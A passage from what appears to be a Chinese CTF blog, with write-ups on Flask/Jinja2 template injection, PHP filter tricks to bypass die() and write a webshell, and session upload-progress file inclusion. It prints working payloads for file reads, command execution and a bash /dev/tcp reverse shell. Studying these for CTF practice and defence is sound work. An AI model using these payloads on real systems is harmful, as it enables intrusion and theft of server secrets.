<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo2</span>():</span></span><br><span class="line">    code = flask.request.args.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    content = <span class="string">&#x27;&lt;p&gt;&#123;0&#125;&lt;/p&gt;&#x27;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(content)</span><br></pre></td></tr></table></figure>

<p>通过以下魔术方法的综合利用，读写任意文件:</p>
<ul>
<li>获取字符串的类对象</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>寻找基类</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br></pre></td></tr></table></figure>

<ul>
<li>返回object的子类</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__subclasses__()</span><br></pre></td></tr></table></figure>

<ul>
<li>以字典格式返回当前位置的全部全局变量</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__globals__ 与func_globals等价</span><br></pre></td></tr></table></figure>

<ul>
<li>利用<code>__subclasses__()</code>方法寻找可用类</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()</span><br><span class="line">小技巧: (<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()).index(file)可迅速定位索引我们所需要的的类位置</span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211112210103765.png">    <img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113112306415.png" alt="image-20211113112306415"></p>
<p>通过基类引出可用引用，可以在其中发现一个&lt;type ‘file’&gt;</p>
<ul>
<li>构造读取文件payload:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__())[<span class="number">40</span>](<span class="string">&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113112917262.png" alt="image-20211113112917262"></p>
<p>也可利用<code>__bases__</code>、<code>object.__subclasses__()</code>进行调用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">()..__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><strong>写文件</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;i am render template inject!&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;,&#x27;w&#x27;).write(&#x27;i am Lihua&#x27;)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;C:\\Users\\86156\\Desktop\\test.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;Object&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113114225347.png" alt="image-20211113114225347"></p>
<p><strong>任意代码执行</strong></p>
<p>思路与任意文件读取十分类似，通过基类拿到os模块，调用系统命令即可。</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># eval</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"><span class="built_in">object</span>.__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment">#__import__</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113122531519.png" alt="image-20211113122531519"></p>
<p><strong>反弹shell</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/你的服务器地址/端口 0&gt;&amp;1&#x27;</span>).read()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个 Payload 不能直接放在 URL 中执行 , 因为 <code>&amp;</code> 的存在会导致 URL 解析出现错误,自然也可使用nc进行反弹shell，且无需编码<br> 可以使用 BurpSuite 等工具构造数据包再发送</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113123000881.png" alt="image-20211113123000881"></p>
<p><strong>获取服务器环境信息</strong></p>
<p>可利用语句获得部分服务器配置信息，如<code>SERVER_SOFTWARE</code>服务平台</p>
<ul>
<li></li>
</ul>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113123437182.png" alt="image-20211113123437182"></p>
<ul>
<li>config.items</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/xss?payload=&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>一个类字典的对象，包含了所有应用程序的配置值</p>
<p>在大多数情况下 , 它包含了比如数据库链接字符串 , 连接到第三方的凭证 , SECRET_KEY等敏感值</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113124027351.png" alt="image-20211113124027351"></p>
<h4 id="沙箱绕过方式"><a href="#沙箱绕过方式" class="headerlink" title="沙箱绕过方式"></a>沙箱绕过方式</h4><p><strong>过滤小括号</strong></p>
<p>利用python自带的内置函数</p>
<ul>
<li>get_flashed_messages()</li>
<li>url_for()</li>
</ul>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;get_flashed.messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>访问变量属性方式</strong></p>
<p>利用<code>.</code>拼接访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>[]</code>访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这两种访问方式完全等价，可用于不严格的过滤</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113130142634.png" alt="image-20211113130142634"></p>
<p>所以说，即便网站过滤点，我们还可使用中括号绕过</p>
<p>如果想要调用字典的键值，其本质是调用了魔术方法<code>__getitem__</code></p>
<p>所以在取字典中的键值时，不仅可以使用<code>[]</code>还可使用<code>__getitem__</code></p>
<p>对于字典来说，我们也可以使用他自带的一些方法来调用其中的值，比如说<code>pop</code>方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop(key[,default])</span><br><span class="line">参数</span><br><span class="line">key: 要删除的键值</span><br><span class="line">default: 如果没有 key，返回 default 值</span><br><span class="line">删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</span><br></pre></td></tr></table></figure>

<p>但是此方法会将字典中的键值删除，如果删除的是服务器关键参数，将会使得服务器崩溃，因此并不推荐其使用</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113132357745.png" alt="image-20211113132357745"></p>
<p><strong>如果我们需要使用字典中的键值时</strong>，可以调用<code>dict.get(&#39;key&#39;) dict.setdefault(&#39;key&#39;)</code>获得键值</p>
<p><img src="/images/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0.assets/image-20211113132557089.png" alt="image-20211113132557089"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-利用php伪协议绕过die" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/" class="article-date">
      <time datetime="2021-10-31T02:36:35.000Z" itemprop="datePublished">2021-10-31</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/31/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die/">利用php伪协议绕过die()</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>file_put_content写入文件遇到exit() 、die() 情况分类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$contnet</span>)</span><br><span class="line">file_put_contents(<span class="variable">$content</span>,<span class="string">&quot;&lt;?php die()&quot;</span>.<span class="variable">$contnet</span>);</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="variable">$contnet</span>.<span class="string">&#x27;\nxxxxxx&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>此处我们可以利用php://filter协议，将文件内容中的die或exit解码掉，以便执行后方的其他语句。</p>
<p><strong>文件名、内容皆可控</strong></p>
<p><strong>base64编码绕过</strong></p>
<p>利用base64编码解码，将exit die解码为乱码，将恶意代码解码还原。</p>
<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031110309150.png" alt="image-20211031110309150"></p>
<p><strong>2、rot13编码绕过</strong></p>
<p>原理与base64解码绕过一致，将die解码为不可识别语句，但此方法需要服务器未开启短标签功能，若开启，就会被解析，后方的代码便会报错失去效果。</p>
<p>本地环境报错。</p>
<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031110649789.png" alt="image-20211031110649789"></p>
<p><strong>过滤器编码套娃使用</strong></p>
<p>利用过滤器嵌套过滤器，使得写入的内容层层解密，最后写入我们预期的代码。</p>
<p><strong>strip_tags|base64-decode去除标签后解密base64</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?filename=php:<span class="comment">//filter/string.strip_tags|convert.base64-decode/resource=shell.php</span></span><br><span class="line">?contnet=<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031112033989.png" alt="image-20211031112033989"></p>
<p>但此方法在php7环境上会由于string.strip_tags的问题发生错误，从而导致无法写入shell，但在php5的环境下不会受此影响.</p>
<p>测试demo ctfshow web入门87：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $content = $_POST[&#x27;content&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);</span><br><span class="line">    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处题目利用file_put_content写文件，并过滤了<code>php</code>、<code>data</code>等关键词，但由于存在urldecode函数，我们可以使用二次url编码绕过;内容处，于文件首写入die(),我们需要绕过die才可执行任意命令。</p>
<p>利用<code>php://filter/writ=convert.base64-decode/resource=shell.php</code> 伪协议将即将写入的内容base64解码，将<code>&lt;?php die(xxx);?&gt;</code>解码为无意义的乱码，使得php无法识别，再将base64编码后的<code>&lt;?php system($_POST[&#39;cmd&#39;]);?&gt;</code>写入以便执行系统命令。</p>
<p>需要注意的是，由于base64_decode识别机制类似于下方代码，只会识别64个可打印字符</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>] = preg_replace(<span class="string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br><span class="line">base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;txt&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>而在<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>中，base64_decode会将其他字符略去，只对<code>php die</code>进行解码操作,同时，base64编码4位一组，需在恶意代码前添加两个字符用于解码，用于避免恶意代码解码错误。</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%37%33%25%36%38%25%36%35%25%36%43%25%36%43%25%32%45%25%37%30%25%36%38%25%37%30</span><br><span class="line"></span><br><span class="line">POST:content=aaPD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure>



<p><img src="/images/%E5%88%A9%E7%94%A8php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87die.assets/image-20211031105448496.png" alt="image-20211031105448496"></p>
<p>参考文章:</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8163#toc-3">https://xz.aliyun.com/t/8163#toc-3</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>











  
    <article id="post-利用session-upload-progress进行文件包含" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a  href="/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
      <time datetime="2021-10-30T13:08:14.000Z" itemprop="datePublished">2021-10-30</time>
</a>

    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a  class="article-title" href="/2021/10/30/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">利用session.upload_progress进行文件包含</a>
    </h1>
  


      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h3 id="Session-上传进度"><a href="#Session-上传进度" class="headerlink" title="Session 上传进度"></a>Session 上传进度</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">此特性自PHP <span class="number">5.4</span>.<span class="number">0</span>后启用</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030211326157.png" alt="image-20211030211326157"></p>
<p>我们可以利用<code>session.upload_progress</code> 将木马写入session文件，然后包含这个文件。但是首先我们需要知道session文件将会保存在何处</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在Linux php中 session文件默认保存在/tmp/sess_session名中</span><br></pre></td></tr></table></figure>

<p>以及会如何保存</p>
<p><img src="/images/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.assets/image-20211030212042701.png" alt="image-20211030212042701"></p>
<p>默认<code>session.use_strict_mode</code>为off状态，也就是说，用户可以在浏览器或者Burpsuit中自定义session ID值用于指明sess文件名。</p>
<p>但是<code>session.upload_progress.cleanup</code>值为默认开启状态</p>
<p>当<code>session.upload_progress.cleanup</code>默认开启时，一旦读取了所有的POST数据，便会清除session文件。</p>
<p>此处我们可以利用条件竞争的方式进行利用文件上传，生成sess文件，趁着sess文件还未删除，进行包含利用。</p>
<p>CTFshow web入门 web82                     </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>此处可以看出，题目排除了<code>php://</code>、<code>data://</code>、<code>日志包含</code>的手法进行getshell，此处尝试利用<code>PHP_UPLOAD_PROGRESS</code>进行getshell</p>
<p>此处利用<code>php.net</code>提供的上传栏代码加以修改:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://f3c16bd0-8f13-4d36-84b1-193366ace33c.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;&lt;?php echo ini_get(&quot;</span><span class="attr">session.upload_progress.name</span>&quot;); ?&gt;</span>&quot; value=&quot;123&quot; /&gt;</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file2&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>cookie处添加<code>PHPSESSID=flag</code> ，在PHP_SESSION_UPLOAD_PROGRESS下添加恶意代码；此时由于PHP的<code>session.use_strict_mode</code>模式默认关闭，生成的session文件将会是<code>sess_flag</code> 同时<code>Linux PHP</code>默认将sess文件存放于/tmp目录下</p>
<p><strong>竞争1</strong></p>
<p>利用bp不停写入sess文件</p>
